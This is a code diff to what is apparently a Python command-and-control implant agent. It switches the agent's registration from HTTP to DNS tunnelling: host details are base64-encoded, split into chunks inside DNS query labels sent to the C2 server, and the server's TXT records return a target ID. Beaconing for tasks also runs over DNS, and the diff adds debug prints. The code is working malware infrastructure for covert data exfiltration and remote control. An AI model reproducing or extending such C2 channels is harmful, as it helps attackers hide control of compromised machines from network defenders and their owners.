@@ -36,7 +36,7 @@ DEFAULT_BEACON_INTERVAL = int(os.environ.get("C2_INTERVAL", "10"))
 DEFAULT_JITTER = float(os.environ.get("C2_JITTER", "0.3"))
 DEFAULT_COMMUNICATION_CHANNEL = os.environ.get("C2_CHANNEL", "http")
 DEFAULT_DNS_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "c2.local")
-DEFAULT_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "5353"))
+DEFAULT_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "15353"))
 API_PREFIX = "/api/v1/agent"
 
 DNS_CHUNK_SIZE = 50  # max chars per label in result queries
@@ -150,6 +150,7 @@ def _parse_txt_response(data: bytes) -> list[bytes]:
 def _dns_query(qname: str, server_ip: str, port: int, retries: int = 3) -> list[bytes]:
     """Send a DNS TXT query and return the TXT strings from the response."""
     packet = _build_dns_query(qname)
+    print(f"[+] Sending DNS query for {qname} to {server_ip}:{port}")
     for attempt in range(retries):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -293,15 +294,33 @@ class DnsChannel(Channel):
             "os": get_os(),
             "communication_channel": "dns",
         }
-        for http_port in [8000, 80, 8080]:
-            resp = _post(f"http://{self._server_ip}:{http_port}{API_PREFIX}/register", data)
-            if resp and "target_id" in resp:
-                return resp["target_id"]
-        return None
+        b64_data = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
+        chunks = [b64_data[i:i + DNS_CHUNK_SIZE] for i in range(0, len(b64_data), DNS_CHUNK_SIZE)]
+        if not chunks:
+            chunks = [""]
+        total = len(chunks)
+        # Send all chunks except the last one (no useful response expected)
+        for idx in range(total - 1):
+            qname = f"{chunks[idx]}.{idx}.{total}.reg.{self._domain}"
+            _dns_query(qname, self._server_ip, self._port)
+            time.sleep(0.05)
+        # Send the last chunk — the server responds with the target_id
+        last_idx = total - 1
+        qname = f"{chunks[last_idx]}.{last_idx}.{total}.reg.{self._domain}"
+        txt_records = _dns_query(qname, self._server_ip, self._port)
+        if not txt_records:
+            return None
+        try:
+            resp_b64 = b"".join(txt_records).decode(errors="replace")
+            resp = json.loads(base64.b64decode(resp_b64 + "==").decode())
+            return resp.get("target_id")
+        except Exception:
+            return None
 
     def beacon(self, target_id: str) -> tuple[list[dict], int, float]:
         qname = f"{target_id}.poll.{self._domain}"
         txt_records = _dns_query(qname, self._server_ip, self._port)
+        print(f"TXT RECORDS for {target_id}: {txt_records}")
         if not txt_records:
             return [], DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER
 
